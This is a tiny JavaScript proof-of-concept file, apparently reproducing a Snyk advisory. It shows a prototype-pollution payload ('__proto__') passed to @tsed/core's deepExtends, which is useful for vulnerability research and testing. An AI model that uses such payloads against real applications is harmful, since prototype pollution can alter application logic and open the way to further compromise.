//https://snyk.io/vuln/SNYK-JS-TSEDCORE-1019382
 
  const { deepExtends } = require("@tsed/core");

  const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

  let obj = {};

   

  let result = deepExtends({ security: [{ 1: "o" }] }, payload);
// End of file
